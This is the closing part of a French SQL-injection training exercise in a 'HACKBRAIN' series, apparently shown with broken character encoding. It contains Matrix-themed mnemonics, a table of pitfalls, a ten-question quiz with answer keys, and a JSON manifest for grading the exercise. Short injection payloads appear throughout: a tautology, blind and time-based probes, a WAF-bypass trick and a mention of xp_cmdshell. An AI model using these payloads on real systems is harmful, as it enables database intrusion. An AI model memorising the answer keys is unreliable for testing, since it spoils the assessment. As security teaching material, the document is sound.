‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  12   ‚îÇ S√©rialisation JSON                                               ‚îÇ Output final                           ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

### 5.8 Mn√©motechniques (MEME obligatoire)

#### üé¨ MEME : "There is no spoon" ‚Äî L'injection SQL

Dans Matrix, Neo r√©alise que la cuill√®re n'existe pas vraiment - tout n'est que donn√©es manipulables.

En SQL injection, c'est pareil : **il n'y a pas de s√©paration entre code et donn√©es** quand on concat√®ne. L'attaquant peut "plier" la requ√™te comme Neo plie la cuill√®re.

```sql
-- Tu penses voir une donn√©e...
id = "123"

-- Mais c'est du code !
id = "123' OR '1'='1"

-- "Do not try to sanitize the input. That's impossible.
--  Instead, only try to realize the truth: there is no separation.
--  Then you'll see that it is not the input that needs sanitizing,
--  it is the query that needs parameterizing."
```

#### üíä MEME : "Red Pill / Blue Pill" ‚Äî Prepared Statements

**Blue Pill (ignorance):**
```sql
query = "SELECT * FROM users WHERE id = '" + id + "'"
-- Tu restes vuln√©rable, inconscient du danger
```

**Red Pill (v√©rit√©):**
```sql
query = "SELECT * FROM users WHERE id = ?"
stmt.execute([id])
-- Tu vois la Matrice pour ce qu'elle est
```

### 5.9 Applications pratiques

| Contexte | Application |
|----------|-------------|
| **Bug Bounty** | D√©tection automatis√©e sur programmes HackerOne/Bugcrowd |
| **Pentest** | Tests d'intrusion applicatifs avec m√©thodologie OWASP |
| **DevSecOps** | SAST dans CI/CD pour d√©tecter les concat√©nations SQL |
| **Forensics** | Analyse post-incident de logs pour identifier les payloads |
| **Training** | CTF et laboratoires d'apprentissage (PortSwigger, TryHackMe) |

---

## ‚ö†Ô∏è SECTION 6 : PI√àGES ‚Äî R√âCAPITULATIF

| # | Pi√®ge | Erreur Courante | Comment l'√âviter |
|---|-------|-----------------|------------------|
| 1 | **Quote mismatch** | Utiliser `'` quand la query utilise `"` | Toujours analyser le quote_type de la query source |
| 2 | **Column count error** | Deviner au lieu de tester | Binary search avec ORDER BY |
| 3 | **DBMS confusion** | Utiliser `SLEEP()` sur MSSQL | Adapter la syntaxe au DBMS (WAITFOR DELAY) |
| 4 | **Comment syntax** | `--` sans espace sur MySQL | Utiliser `-- -` ou `#` pour MySQL |
| 5 | **NULL input crash** | `.unwrap()` sur JSON invalide | Toujours valider avec `match` |
| 6 | **Max length ignor√©** | G√©n√©rer un payload de 200 chars pour limit=50 | V√©rifier avant de retourner |
| 7 | **WAF bypass na√Øf** | Supprimer le keyword au lieu de le transformer | Case variation ou comment injection |
| 8 | **SQLite oubli√©** | Pas de `information_schema` | Utiliser `sqlite_master` |
| 9 | **Second-order ignor√©** | Ne chercher que les injections directes | Analyser aussi les donn√©es stock√©es |
| 10 | **CVSS fixe** | M√™me score pour tous les types | STACKED/OOB = CRITICAL, BLIND = HIGH |

---

## üìù SECTION 7 : QCM

### Question 1
**Quelle est la diff√©rence principale entre une injection UNION-based et BLIND?**

- A) UNION-based est plus lente
- B) BLIND ne retourne pas de donn√©es dans la r√©ponse HTTP
- C) UNION-based fonctionne uniquement sur MySQL
- D) BLIND n√©cessite des droits administrateur
- E) UNION-based ne peut pas extraire de donn√©es
- F) BLIND est impossible √† exploiter
- G) UNION-based n√©cessite JavaScript
- H) BLIND fonctionne uniquement avec HTTPS
- I) UNION-based est d√©tect√©e par tous les WAF
- J) BLIND est un type de XSS

**R√©ponse : B**

### Question 2
**Comment d√©termine-t-on le nombre de colonnes pour une injection UNION?**

- A) En lisant la documentation de l'application
- B) En utilisant ORDER BY avec binary search jusqu'√† l'erreur
- C) Le nombre est toujours 4
- D) Avec SELECT COUNT(*)
- E) En analysant le HTML de la page
- F) Avec la fonction COLUMNS()
- G) Le DBMS le retourne automatiquement
- H) En comptant les champs du formulaire
- I) Avec SHOW COLUMNS
- J) C'est impossible √† d√©terminer

**R√©ponse : B**

### Question 3
**Quel payload est correct pour un time-based blind sur PostgreSQL?**

- A) `' AND SLEEP(5)--`
- B) `' AND pg_sleep(5)--`
- C) `' WAITFOR DELAY '0:0:5'--`
- D) `' AND BENCHMARK(5)--`
- E) `' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)--`
- F) `' AND delay(5000)--`
- G) `' AND setTimeout(5000)--`
- H) `'; EXEC sleep 5--`
- I) `' OR WAIT(5)--`
- J) `' AND TIME_SLEEP(5)--`

**R√©ponse : B**

### Question 4
**Quelle technique de WAF bypass utilise des commentaires SQL?**

- A) `UNION` ‚Üí `ONION`
- B) `UNION` ‚Üí `UN/**/ION`
- C) `UNION` ‚Üí `%55NION`
- D) `UNION` ‚Üí `UNION;`
- E) `UNION` ‚Üí `UN\ION`
- F) `UNION` ‚Üí `UNIONALL`
- G) `UNION` ‚Üí `UN-ION`
- H) `UNION` ‚Üí `UNION/*`
- I) `UNION` ‚Üí `UN ION`
- J) `UNION` ‚Üí `\UNION`

**R√©ponse : B**

### Question 5
**Quelle est la rem√©diation correcte pour une injection SQL?**

- A) Filtrer les caract√®res sp√©ciaux
- B) Utiliser des prepared statements avec param√®tres
- C) Encoder en Base64
- D) Limiter la longueur de l'input
- E) Utiliser un WAF
- F) Hasher l'input
- G) Utiliser HTTPS
- H) Ajouter des quotes autour de l'input
- I) Utiliser escape_string()
- J) V√©rifier que l'input est alphanum√©rique

**R√©ponse : B**

### Question 6
**Sur MSSQL, quelle fonction permet l'ex√©cution de commandes syst√®me?**

- A) `SYSTEM()`
- B) `xp_cmdshell`
- C) `EXEC_CMD()`
- D) `RUN()`
- E) `SHELL()`
- F) `CMD_EXECUTE()`
- G) `os.system()`
- H) `CALL_SYSTEM()`
- I) `sp_execute`
- J) `master.exec()`

**R√©ponse : B**

### Question 7
**Quelle table syst√®me contient les noms de tables sur MySQL?**

- A) `sys.tables`
- B) `information_schema.tables`
- C) `pg_catalog.pg_tables`
- D) `all_tables`
- E) `sqlite_master`
- F) `mysql.tables`
- G) `schema.tables`
- H) `db.tables`
- I) `system.tables`
- J) `meta.tables`

**R√©ponse : B**

### Question 8
**Quel type d'injection est le plus dangereux?**

- A) UNION-based (CVSS 5.0)
- B) Boolean-based blind (CVSS 6.0)
- C) Stacked queries avec xp_cmdshell (CVSS 10.0)
- D) Error-based (CVSS 4.0)
- E) Time-based blind (CVSS 3.0)
- F) Tous ont le m√™me impact
- G) UNION est toujours le plus grave
- H) Blind est le plus grave car difficile √† d√©tecter
- I) Error-based est le plus grave car visible
- J) Time-based est inoffensif

**R√©ponse : C**

### Question 9
**Comment fonctionne l'extraction binary search en blind SQLi?**

- A) On teste toutes les valeurs possibles
- B) On divise l'espace de recherche par 2 √† chaque requ√™te
- C) On utilise un dictionnaire de mots
- D) On attend que le serveur r√©ponde
- E) On utilise la force brute
- F) On analyse les temps de r√©ponse uniquement
- G) On utilise des expressions r√©guli√®res
- H) On compte les caract√®res
- I) On utilise LIKE avec wildcards
- J) On demande au serveur la valeur compl√®te

**R√©ponse : B**

### Question 10
**Quelle est la CWE associ√©e √† l'injection SQL?**

- A) CWE-79 (XSS)
- B) CWE-89 (SQL Injection)
- C) CWE-94 (Code Injection)
- D) CWE-78 (OS Command Injection)
- E) CWE-22 (Path Traversal)
- F) CWE-352 (CSRF)
- G) CWE-287 (Authentication Bypass)
- H) CWE-200 (Information Disclosure)
- I) CWE-434 (File Upload)
- J) CWE-918 (SSRF)

**R√©ponse : B**

---

## üìä SECTION 8 : R√âCAPITULATIF

### Comp√©tences acquises

| Comp√©tence | Niveau | Validation |
|------------|--------|------------|
| Identification de points d'injection | ‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ | Types de quotes, param√®tres |
| G√©n√©ration de payloads UNION | ‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ | MySQL, PostgreSQL, MSSQL, Oracle, SQLite |
| Exploitation Blind SQLi | ‚òÖ‚òÖ‚òÖ‚òÖ‚òÜ | Boolean et Time-based |
| Techniques de bypass WAF | ‚òÖ‚òÖ‚òÖ‚òÖ‚òÜ | Case variation, comments, encoding |
| Remediation s√©curis√©e | ‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ | Prepared statements |
| Analyse multi-DBMS | ‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ | 5 DBMS diff√©rents |

### Points cl√©s √† retenir

1. **Toujours analyser le quote type** avant de g√©n√©rer un payload
2. **Adapter la syntaxe au DBMS** (SLEEP vs pg_sleep vs WAITFOR)
3. **Le bypass WAF** peut √™tre aussi simple qu'un changement de casse
4. **Les prepared statements** sont la SEULE rem√©diation fiable
5. **Le CVSS varie** selon le type d'injection (STACKED > UNION > BLIND)

### Progression sugg√©r√©e

```
SQL Injection Laboratory
         ‚îÇ
         ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ WAF Bypass      ‚îÇ ‚Üê Prochain exercice
‚îÇ Challenge       ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
         ‚îÇ
         ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ XSS Payload     ‚îÇ
‚îÇ Craftsman       ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
         ‚îÇ
         ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ Multi-Injection ‚îÇ
‚îÇ Detector        ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

## üì¶ SECTION 9 : DEPLOYMENT PACK (JSON COMPLET)

```json
{
  "deploy": {
    "hackbrain_version": "5.5.2",
    "engine_version": "v22.1",
    "exercise_slug": "3.3.3-d-sql-injection-laboratory",
    "generated_at": "2026-01-11T10:00:00Z",

    "metadata": {
      "exercise_id": "3.3.3-d",
      "exercise_name": "sql_injection_laboratory",
      "module": "3.3.3",
      "module_name": "Injection SQL Avanc√©e",
      "concept": "d",
      "concept_name": "Laboratoire SQL Injection Complet",
      "type": "code",
      "tier": 2,
      "tier_info": "M√©lange (concepts a + b + c + d + e + f + k)",
      "phase": 3,
      "difficulty": 8,
      "difficulty_stars": "‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ‚òÜ‚òÜ",
      "language": "rust",
      "language_version": "edition2024",
      "duration_minutes": 360,
      "xp_base": 500,
      "xp_bonus_multiplier": 6,
      "bonus_tier": "GENIUS",
      "bonus_icon": "üß†",
      "complexity_time": "T3 O(n√óm)",
      "complexity_space": "S2 O(n)",
      "prerequisites": ["3.3.2.e", "3.3.1.a"],
      "domains": ["Crypto", "Net", "Struct"],
      "domains_bonus": ["Compression"],
      "tags": ["sqli", "injection", "owasp", "database", "security", "matrix", "phase3"],
      "meme_reference": "Matrix - There is no spoon"
    },

    "files": {
      "spec.json": "/* Section 4.9 content */",
      "references/ref_solution.rs": "/* Section 4.3 content */",
      "references/ref_solution_bonus.rs": "/* Section 4.6 content */",
      "alternatives/alt_regex.rs": "/* Section 4.4 Alternative A */",
      "alternatives/alt_builder.rs": "/* Section 4.4 Alternative B */",
      "mutants/mutant_a_boundary.rs": "/* Section 4.10 Mutant A */",
      "mutants/mutant_b_safety.rs": "/* Section 4.10 Mutant B */",
      "mutants/mutant_c_resource.rs": "/* Section 4.10 Mutant C */",
      "mutants/mutant_d_logic.rs": "/* Section 4.10 Mutant D */",
      "mutants/mutant_e_return.rs": "/* Section 4.10 Mutant E */",
      "mutants/mutant_f_edge.rs": "/* Section 4.10 Mutant F */",
      "tests/main.rs": "/* Section 4.2 content */"
    },

    "validation": {
      "expected_pass": [
        "references/ref_solution.rs",
        "references/ref_solution_bonus.rs",
        "alternatives/alt_regex.rs",
        "alternatives/alt_builder.rs"
      ],
      "expected_fail": [
        "mutants/mutant_a_boundary.rs",
        "mutants/mutant_b_safety.rs",
        "mutants/mutant_c_resource.rs",
        "mutants/mutant_d_logic.rs",
        "mutants/mutant_e_return.rs",
        "mutants/mutant_f_edge.rs"
      ]
    },

    "commands": {
      "validate_spec": "python3 hackbrain_engine_v22.py --validate-spec spec.json",
      "test_reference": "cargo test --release",
      "test_mutants": "python3 hackbrain_mutation_tester.py -r ref_solution.rs -s spec.json --validate",
      "lint": "cargo clippy -- -D warnings",
      "format": "cargo fmt --check"
    },

    "cwe_mapping": {
      "primary": "CWE-89",
      "secondary": ["CWE-943", "CWE-564"],
      "owasp": "A03:2021-Injection"
    },

    "resources": {
      "owasp_sqli": "https://owasp.org/www-community/attacks/SQL_Injection",
      "portswigger_sqli": "https://portswigger.net/web-security/sql-injection",
      "sqlmap_docs": "https://github.com/sqlmapproject/sqlmap/wiki"
    }
  }
}
```

---

*HACKBRAIN v5.5.2 ‚Äî SQL Injection Laboratory*
*"There is no spoon... there is no separation between code and data"*
*Compatible ENGINE v22.1 + Mutation Tester*

